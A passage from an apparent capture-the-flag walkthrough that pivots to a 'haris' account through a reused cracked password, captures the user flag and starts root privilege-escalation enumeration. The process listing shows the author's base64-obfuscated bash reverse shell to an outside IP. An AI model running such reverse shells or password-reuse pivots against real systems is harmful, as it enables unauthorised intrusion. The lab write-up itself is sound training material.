With a plaintext credential for `haris` in hand, the next step is to test whether this password is reused for the OS-level `haris` account on the system.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 4.4 Lateral Movement to `haris` Confirmed

**Command:** `su haris`

**Breakdown:**

- `su`
    - **Description:** Switch User — allows switching to another user account from within the current shell session.
    - **Purpose:** Tests whether the bcrypt-cracked database password (`bestfriends`) is reused for the corresponding OS-level account — continuing the password reuse pattern established earlier in this engagement.
- `haris`
    - **Description:** The target username to switch to.
    - **Purpose:** `haris` was identified as the most likely OS-level account from the database dump based on its realistic username and non-admin group assignment.

**Result:**

```shell
www-data@enigma:~/html/openstamanager/files$ su haris
su haris
Password: bestfriends
id
uid=1000(haris) gid=1000(haris) groups=1000(haris),100(users)
```

The switch succeeded — confirming once again that credentials are being reused across different systems within this environment. The same password stored in the OpenSTAManager database is also the login password for the `haris` OS account.

The `id` output confirms we are now operating as a real system user:

- `uid=1000` — a standard non-root user account (root is always uid=0)
- `gid=1000(haris)` — primary group is haris
- `groups=1000(haris),100(users)` — also a member of the `users` group, which is a standard group for regular Linux desktop/workstation users
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 4.5 User Flag Captured

```shell
cd ~
ls
mail
user.txt
cat user.txt
b1c23278e35c69ad72a7ee3d48ed4410
```

**Result:**

```
b1c23278e35c69ad72a7ee3d48ed4410
```

**USER FLAG: `b1c23278e35c69ad72a7ee3d48ed4410`**
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 5. PrivEsc to Root

### 5.1 Check sudo permissions first

With a foothold as `haris`, work through the standard privilege escalation checklist, starting with the most straightforward checks first.

**Command:** `sudo -l`

**Breakdown:**

- `-l`
    - **Description:** Lists the commands the current user is permitted to run via sudo.
    - **Purpose:** The first and most direct privilege escalation check — if `haris` can run anything as sudo, the path to root could be trivial.

**Result:**

```shell
sudo -l
sudo: a terminal is required to read the password; either use the -S option to read from standard input or configure an askpass helper
sudo: a password is required
```

`sudo -l` requires a proper TTY to prompt for a password, which we don't have in this raw reverse shell. This doesn't necessarily mean `haris` has no sudo rights — only that we can't check right now without upgrading the shell. Moving on to the next check
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 5.2 Check SUID binaries

**Command:** `find / -perm -4000 -type f 2>/dev/null`

**Breakdown:**

- `-perm -4000`
    - **Description:** Matches files with the SUID bit set — files that run as their owner (usually root) regardless of who executes them.
    - **Purpose:** SUID binaries owned by root are a classic privilege escalation vector if any of them are known to be exploitable.
- `-type f`
    - **Description:** Restricts results to regular files only.
    - **Purpose:** Avoids matching directories or symlinks that also happen to have the SUID bit set.
- `2>/dev/null`
    - **Description:** Suppresses permission denied errors.
    - **Purpose:** Keeps the output clean since we can't read every directory on the system as `haris`.

**Result:**

```
find / -perm -4000 -type f 2>/dev/null
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/chfn
/usr/bin/fusermount3
/usr/bin/newgrp
/usr/bin/sudo
/usr/bin/mount
/usr/bin/su
/usr/bin/chsh
/usr/bin/passwd
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/polkit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/sbin/mount.nfs
```

Every binary in this list is a standard Ubuntu system binary — none are custom scripts, unusual third-party tools, or known exploitable versions. There is nothing here that provides a clear privilege escalation path. Moving on.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 5.3 Check running processes

**Command:** `ps aux`

**Breakdown:**

- `a`
    - **Description:** Shows processes from all users, not just the current user.
    - **Purpose:** Gives a complete picture of everything running on the system, including processes owned by root that we might be able to interact with.
- `u`
    - **Description:** Displays output in user-oriented format, including the owning username, CPU, and memory usage.
    - **Purpose:** Makes it immediately visible which processes are running as root versus other users.
- `x`
    - **Description:** Includes processes not attached to a terminal.
    - **Purpose:** Captures background daemons and services — exactly the kind of processes most likely to offer a privilege escalation path.

**Result:**

```shell
ps aux
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.0  0.3  22484 13640 ?        Ss   Jun30   0:04 /sbin/init
root           2  0.0  0.0      0     0 ?        S    Jun30   0:00 [kthreadd]
root           3  0.0  0.0      0     0 ?        S    Jun30   0:00 [pool_workqueue_release]
root           4  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/R-rcu_g]
root           5  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/R-rcu_p]
root           6  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/R-slub_]
root           7  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/R-netns]
root          11  0.0  0.0      0     0 ?        I    Jun30   0:00 [kworker/u4:0-ipv6_addrconf]
root          12  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/R-mm_pe]
root          13  0.0  0.0      0     0 ?        I    Jun30   0:00 [rcu_tasks_kthread]
root          14  0.0  0.0      0     0 ?        I    Jun30   0:00 [rcu_tasks_rude_kthread]
root          15  0.0  0.0      0     0 ?        I    Jun30   0:00 [rcu_tasks_trace_kthread]
root          16  0.0  0.0      0     0 ?        S    Jun30   0:00 [ksoftirqd/0]
root          17  0.0  0.0      0     0 ?        I    Jun30   0:07 [rcu_preempt]
root          18  0.0  0.0      0     0 ?        S    Jun30   0:00 [migration/0]
root          19  0.0  0.0      0     0 ?        S    Jun30   0:00 [idle_inject/0]
root          20  0.0  0.0      0     0 ?        S    Jun30   0:00 [cpuhp/0]
root          21  0.0  0.0      0     0 ?        S    Jun30   0:00 [cpuhp/1]
root          22  0.0  0.0      0     0 ?        S    Jun30   0:00 [idle_inject/1]
root          23  0.0  0.0      0     0 ?        S    Jun30   0:00 [migration/1]
root          24  0.0  0.0      0     0 ?        R    Jun30   0:00 [ksoftirqd/1]
root          26  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/1:0H-events_highpri]
root          29  0.0  0.0      0     0 ?        S    Jun30   0:00 [kdevtmpfs]
root          30  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/R-inet_]
root          31  0.0  0.0      0     0 ?        S    Jun30   0:00 [kauditd]
root          32  0.0  0.0      0     0 ?        S    Jun30   0:00 [khungtaskd]
root          33  0.0  0.0      0     0 ?        S    Jun30   0:00 [oom_reaper]
root          35  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/R-write]
root          37  0.0  0.0      0     0 ?        S    Jun30   0:01 [kcompactd0]
root          38  0.0  0.0      0     0 ?        SN   Jun30   0:00 [ksmd]
root          40  0.0  0.0      0     0 ?        SN   Jun30   0:00 [khugepaged]
root          41  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/R-kinte]
root          42  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/R-kbloc]
root          43  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/R-blkcg]
root          44  0.0  0.0      0     0 ?        S    Jun30   0:00 [irq/9-acpi]
root          45  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/R-tpm_d]
root          46  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/R-ata_s]
root          47  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/R-md]
root          48  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/R-md_bi]
root          49  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/R-edac-]
root          50  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/R-devfr]
root          51  0.0  0.0      0     0 ?        S    Jun30   0:00 [watchdogd]
root          52  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/R-quota]
root          54  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/1:1H-kblockd]
root          55  0.0  0.0      0     0 ?        S    Jun30   0:00 [kswapd0]
root          56  0.0  0.0      0     0 ?        S    Jun30   0:00 [ecryptfs-kthread]
root          57  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/R-kthro]
root          58  0.0  0.0      0     0 ?        S    Jun30   0:00 [irq/24-pciehp]
root          59  0.0  0.0      0     0 ?        S    Jun30   0:00 [irq/25-pciehp]
root          60  0.0  0.0      0     0 ?        S    Jun30   0:00 [irq/26-pciehp]
root          61  0.0  0.0      0     0 ?        S    Jun30   0:00 [irq/27-pciehp]
root          62  0.0  0.0      0     0 ?        S    Jun30   0:00 [irq/28-pciehp]
root          63  0.0  0.0      0     0 ?        S    Jun30   0:00 [irq/29-pciehp]
root          64  0.0  0.0      0     0 ?        S    Jun30   0:00 [irq/30-pciehp]
root          65  0.0  0.0      0     0 ?        S    Jun30   0:00 [irq/31-pciehp]
root          66  0.0  0.0      0     0 ?        S    Jun30   0:00 [irq/32-pciehp]
root          67  0.0  0.0      0     0 ?        S    Jun30   0:00 [irq/33-pciehp]
root          68  0.0  0.0      0     0 ?        S    Jun30   0:00 [irq/34-pciehp]
root          69  0.0  0.0      0     0 ?        S    Jun30   0:00 [irq/35-pciehp]
root          70  0.0  0.0      0     0 ?        S    Jun30   0:00 [irq/36-pciehp]
root          71  0.0  0.0      0     0 ?        S    Jun30   0:00 [irq/37-pciehp]
root          72  0.0  0.0      0     0 ?        S    Jun30   0:00 [irq/38-pciehp]
root          73  0.0  0.0      0     0 ?        S    Jun30   0:00 [irq/39-pciehp]
root          74  0.0  0.0      0     0 ?        S    Jun30   0:00 [irq/40-pciehp]
root          75  0.0  0.0      0     0 ?        S    Jun30   0:00 [irq/41-pciehp]
root          76  0.0  0.0      0     0 ?        S    Jun30   0:00 [irq/42-pciehp]
root          77  0.0  0.0      0     0 ?        S    Jun30   0:00 [irq/43-pciehp]
root          78  0.0  0.0      0     0 ?        S    Jun30   0:00 [irq/44-pciehp]
root          79  0.0  0.0      0     0 ?        S    Jun30   0:00 [irq/45-pciehp]
root          80  0.0  0.0      0     0 ?        S    Jun30   0:00 [irq/46-pciehp]
root          81  0.0  0.0      0     0 ?        S    Jun30   0:00 [irq/47-pciehp]
root          82  0.0  0.0      0     0 ?        S    Jun30   0:00 [irq/48-pciehp]
root          83  0.0  0.0      0     0 ?        S    Jun30   0:00 [irq/49-pciehp]
root          84  0.0  0.0      0     0 ?        S    Jun30   0:00 [irq/50-pciehp]
root          85  0.0  0.0      0     0 ?        S    Jun30   0:00 [irq/51-pciehp]
root          86  0.0  0.0      0     0 ?        S    Jun30   0:00 [irq/52-pciehp]
root          87  0.0  0.0      0     0 ?        S    Jun30   0:00 [irq/53-pciehp]
root          88  0.0  0.0      0     0 ?        S    Jun30   0:00 [irq/54-pciehp]
root          89  0.0  0.0      0     0 ?        S    Jun30   0:00 [irq/55-pciehp]
root          90  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/R-acpi_]
root          92  0.0  0.0      0     0 ?        S    Jun30   0:00 [scsi_eh_0]
root          93  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/R-scsi_]
root          94  0.0  0.0      0     0 ?        S    Jun30   0:00 [scsi_eh_1]
root          95  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/R-scsi_]
root          99  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/R-mld]
root         100  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/R-ipv6_]
root         101  0.0  0.0      0     0 ?        I    Jun30   0:00 [kworker/u4:1-ext4-rsv-conversion]
root         108  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/R-kstrp]
root         110  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/u7:0]
root         111  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/u8:0]
root         112  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/u9:0]
root         125  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/R-charg]
root         156  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/0:1H]
root         176  0.0  0.0      0     0 ?        S    Jun30   0:00 [scsi_eh_2]
root         177  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/R-scsi_]
root         178  0.0  0.0      0     0 ?        S    Jun30   0:00 [scsi_eh_3]
root         179  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/R-scsi_]
root         180  0.0  0.0      0     0 ?        S    Jun30   0:00 [scsi_eh_4]
root         181  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/R-scsi_]
root         182  0.0  0.0      0     0 ?        S    Jun30   0:00 [scsi_eh_5]
root         183  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/R-scsi_]
root         184  0.0  0.0      0     0 ?        S    Jun30   0:00 [scsi_eh_6]
root         185  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/R-scsi_]
root         194  0.0  0.0      0     0 ?        S    Jun30   0:00 [scsi_eh_7]
root         195  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/R-scsi_]
root         196  0.0  0.0      0     0 ?        S    Jun30   0:00 [scsi_eh_8]
root         197  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/R-scsi_]
root         198  0.0  0.0      0     0 ?        S    Jun30   0:00 [scsi_eh_9]
root         199  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/R-scsi_]
root         202  0.0  0.0      0     0 ?        S    Jun30   0:00 [scsi_eh_10]
root         203  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/R-scsi_]
root         205  0.0  0.0      0     0 ?        S    Jun30   0:00 [scsi_eh_11]
root         206  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/R-scsi_]
root         207  0.0  0.0      0     0 ?        S    Jun30   0:00 [scsi_eh_12]
root         209  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/R-scsi_]
root         210  0.0  0.0      0     0 ?        S    Jun30   0:00 [scsi_eh_13]
root         213  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/R-scsi_]
root         216  0.0  0.0      0     0 ?        S    Jun30   0:00 [scsi_eh_14]
root         217  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/R-scsi_]
root         218  0.0  0.0      0     0 ?        S    Jun30   0:00 [scsi_eh_15]
root         219  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/R-scsi_]
root         220  0.0  0.0      0     0 ?        S    Jun30   0:00 [scsi_eh_16]
root         221  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/R-scsi_]
root         222  0.0  0.0      0     0 ?        S    Jun30   0:00 [scsi_eh_17]
root         223  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/R-scsi_]
root         224  0.0  0.0      0     0 ?        S    Jun30   0:00 [scsi_eh_18]
root         225  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/R-scsi_]
root         226  0.0  0.0      0     0 ?        S    Jun30   0:00 [scsi_eh_19]
root         227  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/R-scsi_]
root         228  0.0  0.0      0     0 ?        S    Jun30   0:00 [scsi_eh_20]
root         229  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/R-scsi_]
root         230  0.0  0.0      0     0 ?        S    Jun30   0:00 [scsi_eh_21]
root         231  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/R-scsi_]
root         232  0.0  0.0      0     0 ?        S    Jun30   0:00 [scsi_eh_22]
root         233  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/R-scsi_]
root         234  0.0  0.0      0     0 ?        S    Jun30   0:00 [scsi_eh_23]
root         235  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/R-scsi_]
root         236  0.0  0.0      0     0 ?        S    Jun30   0:00 [scsi_eh_24]
root         237  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/R-scsi_]
root         238  0.0  0.0      0     0 ?        S    Jun30   0:00 [scsi_eh_25]
root         239  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/R-scsi_]
root         240  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/R-mpt_p]
root         241  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/R-mpt/0]
root         242  0.0  0.0      0     0 ?        S    Jun30   0:00 [scsi_eh_26]
root         243  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/R-scsi_]
root         244  0.0  0.0      0     0 ?        S    Jun30   0:00 [scsi_eh_27]
root         245  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/R-scsi_]
root         246  0.0  0.0      0     0 ?        S    Jun30   0:00 [scsi_eh_28]
root         247  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/R-scsi_]
root         248  0.0  0.0      0     0 ?        S    Jun30   0:00 [scsi_eh_29]
root         249  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/R-scsi_]
root         250  0.0  0.0      0     0 ?        S    Jun30   0:00 [scsi_eh_30]
root         251  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/R-scsi_]
root         252  0.0  0.0      0     0 ?        S    Jun30   0:00 [scsi_eh_31]
root         253  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/R-scsi_]
root         283  0.0  0.0      0     0 ?        S    Jun30   0:00 [scsi_eh_32]
root         284  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/R-scsi_]
root         313  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/R-raid5]
root         344  0.0  0.0      0     0 ?        D    Jun30   0:01 [jbd2/sda4-8]
root         345  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/R-ext4-]
root         402  0.0  0.4  50500 17396 ?        S<s  Jun30   0:03 /usr/lib/systemd/systemd-journald
root         404  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/R-rpcio]
root         405  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/R-xprti]
root         469  0.0  0.2  29872  8600 ?        Ss   Jun30   0:00 /usr/lib/systemd/systemd-udevd
root         475  0.0  0.0      0     0 ?        S    Jun30   0:00 [psimon]
root         561  0.0  0.0      0     0 ?        S    Jun30   0:00 [jbd2/sda2-8]
root         562  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/R-ext4-]
_rpc         639  0.0  0.1   7968  4072 ?        Ss   Jun30   0:00 /sbin/rpcbind -f -w
root         647  0.0  0.0  86048  2956 ?        R<sl Jun30   0:03 /sbin/auditd
_laurel      651  0.0  0.1  10032  6452 ?        S<   Jun30   0:04 /usr/local/sbin/laurel --config /etc/laurel/config.toml
systemd+     653  0.0  0.3  22264 13604 ?        Ss   Jun30   0:03 /usr/lib/systemd/systemd-resolved
systemd+     664  0.0  0.1  91028  7812 ?        Ssl  Jun30   0:02 /usr/lib/systemd/systemd-timesyncd
root         698  0.0  0.0   5140  1660 ?        Ss   Jun30   0:00 /usr/sbin/blkmapd
root         702  0.0  0.0   5632  3056 ?        Ss   Jun30   0:00 /usr/sbin/nfsdcld
root         717  0.0  0.0      0     0 ?        S    Jun30   0:00 [irq/60-vmw_vmci]
root         718  0.0  0.0      0     0 ?        S    Jun30   0:00 [irq/61-vmw_vmci]
root         738  0.0  0.0      0     0 ?        S    Jun30   0:00 [audit_prune_tree]
root         742  0.0  0.0      0     0 ?        S    Jun30   0:00 [irq/16-vmwgfx]
root         750  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/R-ttm]
root         756  0.0  0.3  53468 12180 ?        Ss   Jun30   0:00 /usr/bin/VGAuthService
root         758  0.1  0.2 317236 10668 ?        Ssl  Jun30   0:47 /usr/bin/vmtoolsd
root         767  0.0  0.0   4068  3236 ?        Ss   Jun30   0:00 dhclient -1 -4 -v -i -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0
message+     804  0.0  0.1   9828  5508 ?        Ss   Jun30   0:01 @dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
root         840  0.0  0.0   5428  3504 ?        Ss   Jun30   0:00 /usr/sbin/fsidd
root         863  0.0  0.5  32192 21320 ?        Ss   Jun30   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
root         874  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/R-crypt]
polkitd      877  0.0  0.2 308164  8032 ?        Ssl  Jun30   0:01 /usr/lib/polkit-1/polkitd --no-debug
root         923  0.0  0.2  18004  8804 ?        Ss   Jun30   0:01 /usr/lib/systemd/systemd-logind
root         948  0.0  0.3 468984 13544 ?        Ssl  Jun30   0:01 /usr/libexec/udisks2/udisksd
syslog      1042  0.0  0.1 222508  5964 ?        Ssl  Jun30   0:00 /usr/sbin/rsyslogd -n -iNONE
root        1320  0.0  0.3 392096 12876 ?        Ssl  Jun30   0:00 /usr/sbin/ModemManager
root        1520  0.0  0.3 1238992 15436 ?       Ssl  Jun30   0:00 /usr/local/bin/OliveTin
root        1521  0.0  0.1   8544  4540 ?        Ss   Jun30   0:00 /usr/sbin/dovecot -F
root        1526  0.0  0.0   6824  2860 ?        Ss   Jun30   0:00 /usr/sbin/cron -f -P
root        1529  0.0  0.8 233244 33500 ?        Ss   Jun30   0:04 php-fpm: master process (/etc/php/8.3/fpm/php-fpm.conf)
root        1530  0.0  0.0   3008  2372 ?        Ss   Jun30   0:00 /usr/sbin/rpc.idmapd
root        1533  0.0  0.0  43212  1916 ?        Ss   Jun30   0:00 /usr/sbin/rpc.mountd
statd       1544  0.0  0.0   4560  2016 ?        Ss   Jun30   0:00 /usr/sbin/rpc.statd
root        1556  0.0  0.0      0     0 ?        I<   Jun30   0:00 [kworker/0:2H-kblockd]
root        1562  0.0  0.0  11296  1852 ?        Ss   Jun30   0:00 nginx: master process /usr/sbin/nginx -g daemon on; master_process on;
www-data    1563  0.0  0.1  13276  5840 ?        S    Jun30   0:00 nginx: worker process
www-data    1564  0.0  0.1  13272  5624 ?        S    Jun30   0:00 nginx: worker process
dovecot     1579  0.0  0.0   5024  3008 ?        S    Jun30   0:00 dovecot/anvil
root        1580  0.0  0.0   5164  3156 ?        S    Jun30   0:00 dovecot/log
root        1592  0.0  0.1   7696  4956 ?        S    Jun30   0:00 dovecot/config
root        1610  0.0  0.0      0     0 ?        I    Jun30   0:00 [lockd]
root        1611  0.0  0.0   6104  1996 tty1     Ss+  Jun30   0:00 /sbin/agetty -o -p -- \u --noclear - linux
root        1616  0.0  0.0      0     0 ?        I    Jun30   0:00 [nfsd]
root        1617  0.0  0.0      0     0 ?        I    Jun30   0:00 [nfsd]
root        1618  0.0  0.0      0     0 ?        I    Jun30   0:00 [nfsd]
root        1619  0.0  0.0      0     0 ?        I    Jun30   0:00 [nfsd]
root        1620  0.0  0.0      0     0 ?        I    Jun30   0:00 [nfsd]
root        1621  0.0  0.0      0     0 ?        I    Jun30   0:00 [nfsd]
root        1622  0.0  0.0      0     0 ?        I    Jun30   0:00 [nfsd]
root        1623  0.0  0.0      0     0 ?        I    Jun30   0:00 [nfsd]
www-data    1625  0.0  1.0 234276 43380 ?        S    Jun30   0:01 php-fpm: pool www
www-data    1626  0.0  1.1 234904 46564 ?        S    Jun30   0:02 php-fpm: pool www
mysql       1660  0.8 11.2 1787608 451096 ?      Ssl  Jun30   6:18 /usr/sbin/mysqld
root        1910  0.0  0.1  42856  4888 ?        Ss   Jun30   0:00 /usr/lib/postfix/sbin/master -w
postfix     1912  0.0  0.1  43344  7880 ?        S    Jun30   0:00 qmgr -l -t unix -u
root        2230  0.0  1.1 614520 45096 ?        Ssl  Jun30   0:03 /usr/libexec/fwupd/fwupd
root        2279  0.0  0.2 313832  8824 ?        Ssl  Jun30   0:00 /usr/libexec/upowerd
www-data    4318  0.0  0.0   2800  1876 ?        S    08:09   0:00 sh -c -- echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS4yMjcvODAgMD4mMQo=|base64 -d|bash
www-data    4321  0.0  0.0   4324  3380 ?        S    08:09   0:00 bash
www-data    4322  0.0  0.0   4588  3948 ?        S    08:09   0:00 bash -i
root        4373  0.1  0.0      0     0 ?        I    08:30   0:11 [kworker/0:0-cgroup_release]
root        4432  0.0  0.0      0     0 ?        I    08:39   0:02 [kworker/1:2-events]
www-data    4683  0.0  0.8 233948 35644 ?        S    09:57   0:00 php-fpm: pool www
root        4745  0.0  0.0      0     0 ?        I    10:09   0:00 [kworker/u6:0-events_unbound]
root        4777  0.0  0.0      0     0 ?        I    10:18   0:00 [kworker/u5:4-events_power_efficient]
root        4780  0.0  0.0      0     0 ?        I    10:20   0:02 [kworker/1:0-cgroup_release]
postfix     4794  0.0  0.1  43304  7916 ?        S    10:31   0:00 pickup -l -t unix -u -c
root        4889  0.1  0.0      0     0 ?        I    10:50   0:04 [kworker/0:3-events]
root        4893  0.0  0.1   6752  4532 ?        S    10:52   0:00 su haris
root        4895  0.0  0.0      0     0 ?        S    10:52   0:00 [psimon]
haris       4897  0.0  0.2  20304 11380 ?        Ss   10:52   0:00 /usr/lib/systemd/systemd --user
haris       4900  0.0  0.0  21156  3564 ?        S    10:52   0:00 (sd-pam)
haris       4911  0.0  0.0   7340  3660 ?        S    10:52   0:00 bash
root        4916  0.0  0.0      0     0 ?        I    10:53   0:00 [kworker/u5:0-events_power_efficient]
root        4952  0.0  0.0      0     0 ?        I    11:08   0:00 [kworker/u6:3-events_unbound]
root        5026  0.0  0.0      0     0 ?        I    11:16   0:00 [kworker/u5:1-flush-8:0]
root        5032  0.0  0.0      0     0 ?        I    11:17   0:00 [kworker/u6:2-events_power_efficient]
root        5038  0.0  0.0      0     0 ?        I    11:20   0:00 [kworker/u5:2-events_power_efficient]
haris       5043  400  0.1  11012  4552 ?        R    11:25   0:00 ps au
```

Scanning through the full process list, the vast majority are standard system daemons — `systemd`, `journald`, `rpcbind`, `dovecot`, `nginx`, `php-fpm`, `mysqld`, `postfix`. Our own reverse shell is also visible:

```shell
www-data  4318  sh -c -- echo YmFzaC...|base64 -d|bashwww-data  4321  bashwww-data  4322  bash -iharis     4911  bash
```

One process stands out immediately from everything else:

```shell
ps aux | grep -i olivetin
root        1520  0.0  0.3 1238992 15436 ?       Ssl  Jun30   0:00 /usr/local/bin/OliveTin
haris       5081  0.0  0.0   6544  2348 ?        S    11:37   0:00 grep -i olivetin
```

**OliveTin** — running as **root**, installed at a non-standard path (`/usr/local/bin/`), and not a default Ubuntu system service. This is exactly the kind of anomaly worth investigating: a third-party application running with full root privileges.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 5.4 Check listening ports


**Command:** `ss -tlnp`

Now that `ps aux` has surfaced OliveTin as a process of interest, `ss -tlnp` is run as a natural follow-up to confirm which port it is bound to and whether it is reachable from our current shell.

**Breakdown:**

- `-t`
    - **Description:** Shows TCP sockets only.
    - **Purpose:** Filters out UDP noise to focus on services accepting connections.
- `-l`
    - **Description:** Shows only listening sockets.
    - **Purpose:** Surfaces active services waiting for connections rather than established sessions.
- `-n`
    - **Description:** Shows numeric addresses and port numbers without resolving names.
    - **Purpose:** Faster output and avoids misleading service-name substitutions.
- `-p`
    - **Description:** Shows the process owning each socket.
    - **Purpose:** Confirms which process is bound to which port — though note this only shows process details for sockets owned by the current user; root-owned sockets show no process name without elevated privileges.

**Result:**

```shell
ss -tlnp
State  Recv-Q Send-Q Local Address:Port  Peer Address:PortProcess
LISTEN 0      100          0.0.0.0:143        0.0.0.0:*          
LISTEN 0      511          0.0.0.0:80         0.0.0.0:*          
LISTEN 0      100          0.0.0.0:110        0.0.0.0:*          
LISTEN 0      4096         0.0.0.0:111        0.0.0.0:*          
LISTEN 0      64           0.0.0.0:2049       0.0.0.0:*          
LISTEN 0      4096         0.0.0.0:22         0.0.0.0:*          
LISTEN 0      4096   127.0.0.53%lo:53         0.0.0.0:*          
LISTEN 0      70         127.0.0.1:33060      0.0.0.0:*          
LISTEN 0      100          0.0.0.0:995        0.0.0.0:*          
LISTEN 0      100          0.0.0.0:993        0.0.0.0:*          
LISTEN 0      100        127.0.0.1:25         0.0.0.0:*          
LISTEN 0      4096         0.0.0.0:54339      0.0.0.0:*          
LISTEN 0      4096         0.0.0.0:44423      0.0.0.0:*          
LISTEN 0      4096      127.0.0.54:53         0.0.0.0:*          
LISTEN 0      64           0.0.0.0:36573      0.0.0.0:*          
LISTEN 0      4096       127.0.0.1:1337       0.0.0.0:*          
LISTEN 0      4096         0.0.0.0:56987      0.0.0.0:*          
LISTEN 0      151        127.0.0.1:3306       0.0.0.0:*          
LISTEN 0      4096         0.0.0.0:36655      0.0.0.0:*          
LISTEN 0      100             [::]:143           [::]:*          
LISTEN 0      511             [::]:80            [::]:*          
LISTEN 0      100             [::]:110           [::]:*          
LISTEN 0      4096            [::]:111           [::]:*          
LISTEN 0      64              [::]:2049          [::]:*          
LISTEN 0      4096            [::]:22            [::]:*          
LISTEN 0      4096            [::]:38951         [::]:*          
LISTEN 0      64              [::]:45449         [::]:*          
LISTEN 0      4096            [::]:51517         [::]:*          
LISTEN 0      100             [::]:995           [::]:*          
LISTEN 0      100             [::]:993           [::]:*          
LISTEN 0      100            [::1]:25            [::]:*          
LISTEN 0      4096            [::]:54295         [::]:*          
LISTEN 0      4096            [::]:48719         [::]:*
```

**Key Findings:**

```shell
